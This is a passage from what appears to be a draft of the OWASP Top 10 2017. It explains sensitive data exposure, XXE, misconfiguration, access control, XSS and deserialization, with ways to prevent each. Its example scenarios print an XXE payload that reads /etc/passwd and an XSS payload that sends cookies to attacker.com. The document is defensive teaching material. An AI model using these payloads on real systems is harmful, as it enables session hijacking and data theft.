<p><em>Scenario #3:</em> One the issues with storage of passwords is the use of plain text, reversibly encrypted passwords, and weakly hashed passwords (such as using MD5/SHA1 with or without a salt). GPU crackers are immensely powerful and cheap. A recent effort by a small group of researchers cracked <a href="https://cynosureprime.blogspot.com.au/2017/08/320-million-hashes-exposed.html">320 million passwords in less than three weeks</a>, including 60 character passwords. The solution to this is the use of adaptive modern hashing algorithms such as Argon2, with salting and sufficient workfactor to prevent the use of rainbow tables, word lists, and realistic recovery of even weak passwords.</p>
<h2 id="references-1">References</h2>
<h3 id="owasp-1">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#5:_Implement_Identity_and_Authentication_Controls">OWASP Proactive Controls - Implement Identity and Authentication Controls</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Application Security Verification Standard - V2 Authentication</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Application Security Verification Standard - V3 Session Management</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_Identity_Management">OWASP Testing Guide: Identity</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_authentication">OWASP Testing Guide: Authentication</a></li>
<li><a href="https://www.owasp.org/index.php/Authentication_Cheat_Sheet">OWASP Authentication Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/Forgot_Password_Cheat_Sheet">OWASP Forgot Password Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet">OWASP Password Storage Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/Session_Management_Cheat_Sheet">OWASP Session Management Cheat Sheet</a></li>
</ul>
<h3 id="external-1">External</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287: Improper Authentication</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/384.html">CWE-384: Session Fixation</a></li>
</ul>
<h1 id="a3-sensitive-data-exposure">A3 Sensitive Data Exposure</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th>Threat agents/Attack vectors</th>
<th>Security Weakness</th>
<th>Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Access Lvl \</td>
<td>Exploitability</td>
<td>Prevalence \</td>
</tr>
<tr class="even">
<td>Manual attack is generally required. This is a core skill of penetration testers and motivated attackers.</td>
<td>Over the last few years, this has been the most common impactful attack, with credit reporting agency breaches of over 150 million records of the most sensitive data possible, the Yahoo breach of over a billion accounts. Manual steps are required to characterize sensitive or legally controlled personally identifiable information, but automated tools can be used to find likely issues.</td>
<td>Failure frequently compromises all data that should have been protected. Typically, this information includes sensitive personal information (PII) data such as health records, credentials, personal data, credit cards, which often requires protection as defined by laws or regulations such as the EU GDPR or local privacy laws.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-attack-2">Am I vulnerable to attack?</h2>
<p>The first thing is to determine the protection needs of data in transit and at rest. For example, passwords, credit card numbers, health records, and personal information require extra protection, particularly if that data falls under the EU's General Data Protection Regulation (GDPR), local privacy laws or regulations, financial data protection regulations and laws, such as PCI Data Security Standard (PCI DSS) or the US Gramm-Leach-Bliley Act, or health records laws, such as the US Health Insurance and Portability Act (HIIPA).</p>
<p>For all such data:</p>
<ul>
<li>Is any data transmitted in clear text, internally or externally? Internet traffic is especially dangerous, but from load balancers to web servers or from web servers to back end systems can also be problematic</li>
<li>Is sensitive data stored in clear text, including backups of this data?</li>
<li>Are any old or weak cryptographic algorithms used either by default or in older code?</li>
<li>Are default crypto keys in use, weak crypto keys generated or re-used, or is proper key management or rotation missing?</li>
<li>Is encryption not enforced, e.g. are any user agent (browser) security directives or headers missing?</li>
</ul>
<p>Passive automated findings from tools, such as version disclosure or stack traces are not sensitive and thus not covered by this risk. For a more complete set of problems to avoid and potential solutions, please see the references below.</p>
<h2 id="how-do-i-prevent-2">How do I prevent</h2>
<p>Do the following, at a minimum and consult the references:</p>
<ul>
<li>Classify data processed, stored or transmitted by a system, for example sensitive personal information, health records, PCI DSS in scope data. Apply controls as per the classification.</li>
<li>Do not collect or store unnecessary sensitive data, or have a data retention plan in place to age out old or unused records. Data you don't retain can't be stolen.</li>
<li>Encrypt all sensitive data in rest</li>
<li>Encrypt all data in transit, such as using TLS. Enforce this using directives like HTTP Strict Transport Security (HSTS). This is a requirement that modern browsers will start enforcing by the time the OWASP Top 10 2017 is released. They are currently alerting to unencrypted sites, and most now prevent login form submissions over clear text.</li>
<li>Ensure up-to-date and strong standard algorithms or ciphers, parameters, protocols and keys are used, and proper key management is in place. Consider using FIPS 140 validated cryptographic modules.</li>
<li>Ensure passwords are stored with a strong adaptive algorithm appropriate for password protection, such as Argon2i, scrypt, bcrypt and PBKDF2. Also be sure to set the work factor (delay factor) as high as you can tolerate.</li>
<li>Disable browser caching of pages and API responses that contain sensitive data.</li>
<li>Verify independently the efficacy of your settings.</li>
</ul>
<h2 id="example-scenarios-2">Example Scenarios</h2>
<p>Scenario #1: An application encrypts credit card numbers in a database using automatic database encryption. However, this data is automatically decrypted when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text. Alternatives include not storing credit card numbers, using tokenization, or using public key encryption.</p>
<p>Scenario #2: A site simply doesn't use or enforce TLS for all pages, or if it supports weak encryption. An attacker simply monitors network traffic, strips or intercepts the TLS (like an open wireless network), and steals the user's session cookie. The attacker then replays this cookie and hijacks the user's (authenticated) session, accessing or modifying the user's private data. Instead of the above he could also alter all transported data, e.g. the recipient of a money transfer.</p>
<p>Scenario #3: The password database uses unsalted hashes to store everyone's passwords. A file upload flaw allows an attacker to retrieve the password database. All the unsalted hashes can be exposed with a rainbow table of pre-calculated hashes.</p>
<h2 id="references-2">References</h2>
<h3 id="owasp-2">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#7:_Protect_Data">OWASP Proactive Controls - Protect Data</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project">OWASP Application Security Verification Standard - V9 Data Protection</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_weak_Cryptography">OWASP Testing Guide - Testing for weak cryptography</a></li>
<li><a href="https://www.owasp.org/index.php/User_Privacy_Protection_Cheat_Sheet">OWASP Cheat Sheet - User Privacy Protection</a></li>
<li><a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet">OWASP Cheat Sheet - Password Storage</a></li>
</ul>
<h3 id="external-2">External</h3>
<p>The primary issue for this finding is protecting sensitive information, and not necessarily if the right algorithms are in place and effective:</p>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/359.html">CWE-359 Exposure of Private Inforamtion (Privacy Violation)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/202.html">CWE-220 Exposure of sensitive information through data queries</a></li>
</ul>
<p>The following CWEs are still very useful in achieving the goal of protecting sensitive data:</p>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/310.html">CWE-310 Cryptographic Issues</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/312.html">CWE-312 Cleartext Storage of Sensitive Information</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319 Cleartext Transmission of Sensitive Information</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/326.html">CWE-326 Weak Encryption</a></li>
</ul>
<p>Example of a failure under this finding includes:</p>
<ul>
<li><p><a href="https://www.bankinfosecurity.com/new-in-depth-analysis-anthem-breach-a-9627">Detailed analysis of Anthem Insurance data breach of 78.8 million sensitive health records</a></p>
<h1 id="a4-xml-external-entities-xxe">A4 XML External Entities (XXE)</h1></li>
</ul>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th>Threat agents/Attack vectors</th>
<th>Security Weakness</th>
<th>Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Access Lvl \</td>
<td>Exploitability</td>
<td>Prevalence \</td>
</tr>
<tr class="even">
<td>Attackers who can access web pages or web services, particularly SOAP web services, that process XML. Penetration testers should be capable of exploiting XXE once trained. DAST tools require additional manual steps to exploit this issue. SAST tools can discover this issue by inspecting dependencies and configuration.</td>
<td>By default, many older XML processors allow specification of an external entity, a URI that is derefenced and evaluated during XML processing.</td>
<td>These flaws can be used to extract data, execute a remote request from the server, scan internal systems, perform a denial-of-service attack, and other attacks.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-attack-3">Am I vulnerable to attack?</h2>
<p>If your application accepts XML input, especially from untrusted sources, you may be vulnerable to XXE. You need to identify each XML processor in your application and determine if <a href="https://en.wikipedia.org/wiki/Document_type_definition">document type definitions (DTDs)</a> has been disabled. As the exact mechanism for disabling DTD processing varies by processor, it is recommended that you consult a reference such as the <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">OWASP XXE Prevention Cheat Sheet</a>.</p>
<p><em>This statement seems weak, can we do better?</em> If your application is using SOAP prior to version 1.2 it is susceptible to XXE attacks unless you have implemented specific remediations to ensure that XML entities are not being passed to the SOAP framework.</p>
<h2 id="how-do-i-prevent-3">How do I prevent</h2>
<p>Preventing XXE requires:</p>
<ul>
<li>Ensure the latest XML processors and libraries are in use. Co</li>
<li>Ensure the XML processor is configured by default to not parse external entities</li>
<li>Use SOAP 1.2 or later</li>
<li>Consider disabling XML DTD processing in all XML parsers in your application.</li>
</ul>
<p>Protecting against XXE attacks also protects against billion laughs denial-of-service attacks.</p>
<p><em>This statement seems weak, can we do better?</em> If you are using SOAP, be sure that you are using version 1.2 or better.</p>
<h2 id="example-scenarios-3">Example Scenarios</h2>
<p>Scenario #1: The attacker attempts to extract data from the server:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
 &lt;!DOCTYPE foo [
  &lt;!ELEMENT foo ANY &gt;
  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
 &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
<p>Scenario #2: An attacker probes the server's private network by changing the above <code>ENTITY</code> line to:</p>
<pre><code>  &lt;!ENTITY xxe SYSTEM &quot;https://192.168.1.1/private/service&quot; &gt;]&gt;</code></pre>
<p>Scenario #3: An attacker attempts a denial-of-service attack by including a potentially endless file:</p>
<pre><code>  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</code></pre>
<h2 id="references-3">References</h2>
<h3 id="owasp-3">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#3:_Encode_Data">OWASP Proactive Controls - TBA</a> - is this a good reference? Maybe there's no strong proactive controls reference for XXE?</li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Application Security Verification Standard</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)">OWASP Testing Guide - Testing for XML Injection</a></li>
<li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing">OWASP XXE Vulnerability</a></li>
<li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">OWASP XXE Prevention Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/XML_Security_Cheat_Sheet">OWASP XML Security Cheat Sheet</a></li>
</ul>
<h3 id="external-3">External</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/611.html">CWE-611 Improper Restriction of XXE</a></li>
<li><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">Billion Laughs Attack</a></li>
</ul>
<h1 id="a5-security-misconfiguration">A5 Security Misconfiguration</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th>Threat agents/Attack vectors</th>
<th>Security Weakness</th>
<th>Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Access Lvl \</td>
<td>Exploitability</td>
<td>Prevalence \</td>
</tr>
<tr class="even">
<td>Even Anonymous attackers access default accounts, unused pages, unpatched flaws, unprotected files and directories, etc. to gain unauthorized access to or knowledge of the system.</td>
<td>Security misconfiguration can happen at any level of an application stack, including the platform, web server, application server, database, frameworks, and custom code. Automated scanners are useful for detecting misconfigurations, use of default accounts or configurations, unnecessary services, legacy options etc.</td>
<td>Such flaws frequently give attackers unauthorized access to some system data or functionality. Occasionally, such flaws result in a complete system compromise. The business impact depends on the protection needs of your application and data.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-attack-4">Am I vulnerable to attack?</h2>
<p>Is your application missing the proper security hardening across any part of the application stack? Including:</p>
<ol>
<li><p>Are any unnecessary features enabled or installed (e.g., ports, services, pages, accounts, privileges)?</p></li>
<li><p>Are default accounts and their passwords still enabled and unchanged?</p></li>
<li><p>Does your error handling reveal stack traces or other overly informative error messages to users?</p></li>
<li><p>Do you still use ancient configs with updated software?<br />
Do you adhere on obsolete backward compatibility?</p></li>
<li><p>Are the security settings in your application servers, application frameworks (e.g., Struts, Spring, ASP.NET), libraries, databases, etc. not set to secure values?</p></li>
<li><p>Does the server not send any security directives to client agents (e.g. in headers) or are they not set to secure values?</p></li>
<li><p>Is any of your software out of date? (see 2017-A9)</p></li>
</ol>
<p>Without a concerted, repeatable application security configuration process, systems are at a higher risk.</p>
<h2 id="how-do-i-prevent-4">How do I prevent</h2>
<p>The primary recommendations are to establish all of the following:</p>
<ol>
<li><p>A repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down. Development, QA, and production environments should all be configured identically (with different passwords used in each environment). This process should be automated to minimize the effort required to setup a new secure environment.</p></li>
<li><p>A process for keeping abreast of and deploying all new software updates and patches in a timely manner to each deployed environment. This process needs to include all components and libraries as well (see 2017-A9). Get get accustomed to new security features.</p></li>
<li><p>A strong application architecture that provides effective, secure separation between components.</p></li>
<li><p>An automated process to verify independently the effectiveness of the configurations and settings in all environments.</p></li>
</ol>
<h2 id="example-scenarios-4">Example Scenarios</h2>
<p>Scenario #1: The app server admin console is automatically installed and not removed. Default accounts aren't changed. Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over.</p>
<p>Scenario #2: Directory listing is not disabled on your web server. An attacker discovers they can simply list directories to find any file. The attacker finds and downloads all your compiled Java classes, which they decompile and reverse engineer to get all your custom code. Attacker then finds a serious access control flaw in your application.</p>
<p>Scenario #3: App server configuration allows stack traces to be returned to users, potentially exposing underlying flaws such as framework versions that are known to be vulnerable.</p>
<p>Scenario #4: App server comes with sample applications that are not removed from your production server. These sample applications have well known security flaws attackers can use to compromise your server.</p>
<p>Scenario #5: The default configuration or a copied old one activates old vulnerable protocol versions or options that can be misused by an attacker or malware.</p>
<h2 id="references-4">References</h2>
<h3 id="owasp-4">OWASP</h3>
<ul>
<li><a href="">OWASP Development Guide: Chapter on Configuration</a></li>
<li><a href="">OWASP Code Review Guide: Chapter on Error Handling</a></li>
<li><a href="">OWASP Testing Guide: Configuration Management</a></li>
<li><a href="">OWASP Testing Guide: Testing for Error Codes</a><br />
For additional requirements in this area, see the <a href="">ASVS requirements areas for Security Configuration (V11 and V19)</a>.</li>
<li>TBD:</li>
<li><a href="">OWASP Proactive Controls - TBA</a></li>
<li><a href="">OWASP Secure Headers Project - TBA</a></li>
<li><a href="">OWASP Application Security Verification Standard - TBA</a></li>
<li><a href="">OWASP Testing Guide - TBA</a></li>
<li><a href="">OWASP Cheat Sheet - TBA</a></li>
</ul>
<h3 id="external-4">External</h3>
<ul>
<li>NIST Guide to General Server Hardening</li>
<li>CWE Entry 2 on Environmental Security Flaws</li>
<li>CIS Security Configuration Guides/Benchmarks</li>
</ul>
<h1 id="a6-access-control">A6 Access Control</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th>Threat agents/Attack vectors</th>
<th>Security Weakness</th>
<th>Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Access Lvl \</td>
<td>Exploitability</td>
<td>Prevalence \</td>
</tr>
<tr class="even">
<td>Exploitation of access control is a core skill of penetration testers. SAST and DAST tools can detect the abscense of access control, but not verify if it is functional. Access control is detectable using manual means, or possibly through automation for the abscence of access controls in certain frameworks.</td>
<td>Access control weaknesses are common due to the lack of automated detection, and lack of effective functional testing by application developers.</td>
<td>The technical impact is anonymous attackers acting as users or administrators, users using privileged functions, or creating, accessing, updating or deleting every record.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-attack-5">Am I vulnerable to attack?</h2>
<p>Access control is the process of ensuring that users cannot act outside of their role or granted permissions, such that they can only access secured information and functionality that they are explicitly granted access. Commonly, applications fail to enforce access control in a wide variety of ways, but typically this can lead to critical unauthorized information disclosure, modification or destruction of all data within a system, or performing a business function well outside of the limits of the user.</p>
<p>Common access control vulnerabilities include:</p>
<ul>
<li>Missing or ineffective presentation access control, accessing hidden, disabled, or privileged functionality through modifying the URL, internal app state, or the HTML page, or simply using a custom API attack tool</li>
<li>Missing or ineffective controller access control, such as not checking that the web, mobile or API caller has privileges or capability to access that function</li>
<li>Missing or ineffective model access control, where the primary key can be changed to another's users record, such as viewing or editing someone else's account</li>
<li>Missing or ineffective domain model access control, where the business logic should enforce limits, such as cinema booking system not permitting individuals from booking out an entire cinema</li>
<li>Elevation of privilege. Acting as a user without being logged in, or acting as an admin whilst logged in as a user</li>
<li>Segregation of duty violations. Such as initating and approving a business flow not normally visible to the original user</li>
<li>Metadata manipulation. Where a JWT access control token can be replayed or modified, or a cookie or hidden field manipulated to elevate privileges (such as changing <code>role=user</code> cookie to <code>admin</code>)</li>
<li>Spidering an application using a proxy such as OWASP Zap, whilst logged on as a high privilege user, and then testing each page and controller whilst not logged in, or logged in as a low privilege user, or if directory browsing, revision control system files and thumbnails might be available to the tool</li>
</ul>
<p>Access control testing is not currently amenable to automated static or dynamic testing, but when identified, it is a severe attack as the attacker has spent considerable effort manually testing the access control matrix before mounting an attack. Such attackers are usually highly competent, effective, and malicous in nature.</p>
<h2 id="how-do-i-prevent-5">How do I prevent</h2>
<p>Access control is only effective if enforced in trusted server-side code or server-less API, where the attacker cannot modify the access control check or metadata.</p>
<ul>
<li>Implement the priciples of deny by default and principle of complete mediation in your architecture, with the exception of public resources</li>
<li>Centralized Implementation. Implement access control mechanisms once and re-use them throughout the application.</li>
<li>Presentation layer access control must be enforced on trusted API endpoints or with server-side access control checks</li>
<li>Controllers should enforce role-based, claims, or capability based access controls</li>
<li>Model access controls should enforce record ownership, rather than accepting that the user can create, read, update or delete any record</li>
<li>Domain access controls are unique to each application, but business limit requirements should be enforced by domain models</li>
<li>Disable web server directory listing, and ensure file metadata such as <code>.git</code>, <code>.Thumbs.db</code> or <code>.DS_Store</code> is not present within web roots</li>
<li>Log access control failures, such that alerting adminsitrators of unauthorized access is possible</li>
</ul>
<p>Large and high performing organizations should consider:</p>
<ul>
<li>Implementing segregation of duties checks in risky or high value business flows</li>
<li>Rate limiting API and controller access to minimize the harm from automated attack tooling</li>
<li>Monitoring and escalate access control failures to operational staff as quickly as possible, particularly where access control failures are occuring extremely rapidly, such as with a scraping tool or similar</li>
</ul>
<p>Developers and QA staff should include functional access control unit and integration tests to demonstrate that access controls are in place, in use, and effective using a variety of user principals, including anonymous access, users acting within their rights, direct object reference attacks - including creating, reading, updating and deleting records, users attempting to elevate privileges or acting outside their authority, and access control metadata attacks.</p>
<p>NB: Automated access control testing by SAST and DAST tools is not currently possible without providing human context. Such testing should not be relied upon to validate access controls are in place, in use and effective.</p>
<h2 id="example-scenarios-5">Example Scenarios</h2>
<p>Scenario #1: The application uses unverified data in a SQL call that is accessing account information:</p>
<p><code><br />
pstmt.setString(1, request.getParameter(&quot;acct&quot;));<br />
ResultSet results = pstmt.executeQuery( );<br />
</code></p>
<p>An attacker simply modifies the 'acct' parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user's account.</p>
<ul>
<li><code>http://example.com/app/accountInfo?acct=notmyacct</code></li>
</ul>
<p>Scenario #2: An attacker simply force browses to target URLs. Admin rights are also required for access to the admin page.</p>
<ul>
<li><code>http://example.com/app/getappInfo</code></li>
<li><code>http://example.com/app/admin_getappInfo</code></li>
</ul>
<p>If an unauthenticated user can access either page, it's a flaw. If a non-admin can access the admin page, this is also a flaw.</p>
<h2 id="references-5">References</h2>
<h3 id="owasp-5">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#6:_Implement_Access_Controls">OWASP Proactive Controls - Access Controls</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home">OWASP Application Security Verification Standard - V4 Access Control</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_Authorization">OWASP Testing Guide - Access Control</a></li>
<li><a href="https://www.owasp.org/index.php/Access_Control_Cheat_Sheet">OWASP Cheat Sheet - Access Control</a></li>
</ul>
<h3 id="external-5">External</h3>
<ul>
<li><a href="">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/284.html">CWE-284: Improper Access Control (Authorization)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/285.html">CWE-285: Improper Authorization</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/639.html">CWE-639: Authorization Bypass Through User-Controlled Key</a></li>
</ul>
<h1 id="a7-cross-site-scripting">A7 Cross Site Scripting</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th>Threat agents/Attack vectors</th>
<th>Security Weakness</th>
<th>Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Access Lvl \</td>
<td>Exploitability</td>
<td>Prevalence \</td>
</tr>
<tr class="even">
<td>Automated tools can detect and exploit all three forms of XSS, and there are freely available exploitation frameworks.</td>
<td>XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications.</td>
<td>The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-attack-6">Am I vulnerable to attack?</h2>
<p>Three are three forms of XSS:</p>
<ul>
<li><strong>Reflected XSS</strong>. If your application or API includes unsanitized user input as part of HTML output, and this is not validated or escaped, or there is no content security policy, the victim's browser will execute the attacker's arbitrary HTML or JavaScript content. Typically the user will need to interact with a link, or some other attacker controlled page, such as a watering hole attack such as malvertizing or similar.</li>
<li><strong>Stored XSS</strong> If your application or API stores unsanitized user input, and then this is viewed at a later time by another user or an administrator, the attacker can run arbitrary HTML or JavaScript on the victim user or administrator's browser. As the impact is higher, stored XSS is often considered a high or critical risk.</li>
<li><strong>DOM XSS</strong>. Modern JavaScript frameworks and single page applications and APIs that dynamically include attacker-controllable data to a page, are vulnerable to DOM XSS. Ideally, you would avoid sending attacker-controllable data to unsafe JavaScript APIs, but context aware escaping, input validation and content security policies can reduce the likelihood of all three forms of XSS.</li>
</ul>
<p>Typical XSS attacks include session stealing, account takeover, MFA bypass, DIV replacement or defacement (such as trojan login DIVs), attacks against the user's browser such as malicious software downloads, key logging, and other client side attacks.</p>
<p>Automated tools can find some XSS problems automatically, particularly in mature technologies such as PHP, J2EE / JSP, and ASP.NET. However, each application builds output pages differently and uses different browser side interpreters such as JavaScript, usually using third party libraries built on top of these technologies. This diversity makes automated detection difficult, particularly when using single-page applications and modern JavaScript frameworks and libraries, particularly if automated tools have not caught up with the new library, or if testers are unfamiliar with DOM XSS.</p>
<p>Development teams seeking to assess if they have cross site scripting should always use the latest frameworks, which typically aim to prevent XSS as a bug class. Deeper verification requires a combination of skilled penetration testing and manual source code review.</p>
<p>Large and high performing organizations should consider the use of automated SAST tools to inspect their source integrated into the CI/CD pipeline, along with automated scripted DAST tools such as OWASP Zap, scanning every build of every application in the portfolio to discover easily discovered flaws with every build. Although not a complete panacea, automated testing has a place in larger organizations where penetration tests after each build or manual source code review is impractical.</p>
<h2 id="how-do-i-prevent-6">How do I prevent</h2>
<p>Preventing XSS requires separation of untrusted data from active browser content.</p>
<ol>
<li><p>Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve <a href="https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Server_XSS">Server XSS</a> vulnerabilities. The <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">OWASP XSS Prevention Cheat Sheet</a> has details on the required data escaping techniques.</p></li>
<li><p>Applying context sensitive encoding when modifying the browser document on the client side acts against <a href="https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Client_XSS">client XSS</a>. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the <a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet">OWASP DOM based XSS Prevention Cheat Sheet</a>.</p></li>
<li><p>Enabling a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy</a>) (CSP) and moving inline javascript code to additional files will defend against XSS across the entire site, assuming no other vulnerabilities (such as upload path tampering or download path traversal) exist that would allow placing malicious code in the server files.</p></li>
</ol>
<h2 id="example-scenarios-6">Example Scenarios</h2>
<p>The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:</p>
<p><code>(String) page += &quot;&lt;input name='creditcard' type='TEXT' value='&quot; + request.getParameter(&quot;CC&quot;) + &quot;'&gt;&quot;;</code></p>
<p>The attacker manipulates the 'CC' parameter in his browser to:</p>
<p><code>'&gt;&lt;script&gt;document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie&lt;/script&gt;'</code></p>
<p>This attack causes the victim's session ID to be sent to the attacker's website, allowing the attacker to hijack the user's current session.<br />
Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ. See 2017-A8 for information on CSRF.</p>
<h2 id="references-6">References</h2>
<h3 id="owasp-6">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016">OWASP Proactive Controls - #3 Encode Data</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016">OWASP Proactive Controls - #4 Validate Data</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project">OWASP Application Security Verification Standard - V5</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)">OWASP Testing Guide: Testing for Reflected XSS</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)">OWASP Testing Guide: Testing for Stored XSS</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)">OWASP Testing Guide: Testing for DOM XSS</a></li>
<li><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">OWASP XSS Prevention Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet">OWASP DOM based XSS Prevention Cheat Sheet</a></li>
<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">OWASP XSS Filter Evasion Cheat Sheet</a></li>
</ul>
<h3 id="external-6">External</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper neutralization of user supplied input</a></li>
<li><a href="https://portswigger.net/knowledgebase/issues/details/00200308_clientsidetemplateinjection">PortSwigger: Client-side template injection</a></li>
</ul>
<h1 id="a8-deserialization">A8 Deserialization</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th>Threat agents/Attack vectors</th>
<th>Security Weakness</th>
<th>Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Access Lvl \</td>
<td>Exploitability</td>
<td>Prevalence \</td>
</tr>
<tr class="even">
<td>Exploitation of deserialization is somewhat difficult, as although there are off the shelf exploits, these rarely work without changes or tweaks to the underlying exploit code. This issue can be discovered by tools, but is not easily verifiable due to backported patches or hidden headers.</td>
<td>There is currently little data on deserialization as yet, but if it was tested more frequently, this issue could easily be a future A1:2020 risk.</td>
<td>The impact of deserialization cannot be understated - it is responsible for the Equifax breach affecting the sensitive personal identifying and financial information of over 150 million people. Deserialization typically allows the attacker to run arbitrary code on the server.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-attack-7">Am I vulnerable to attack?</h2>
<p>Application architecture has changed dramatically over the last few years, with the move to &quot;server-less&quot; API driven mobile and single page applications, with the associated rise of functional programming frameworks and languages. This seismic shift in application architecture were accompanied by the idea of the client maintaining state, to allow theoretical simpler and more scalable functional code. However, the hallmark of application security is the location of trusted state. Security state cannot be sent to the client without some form of integrity promise.</p>
<p>Applications and APIs will be vulnerable if the code:</p>
<ul>
<li>The client can create, replay, tamper, or chain existing serialized state (gadgets), AND</li>
<li>The server or API deserializes hostile objects supplied by an attacker, AND</li>
<li>The objects contain a constructor, destructor, callbacks, auto-instantiation (such as rehydration calls) OR</li>
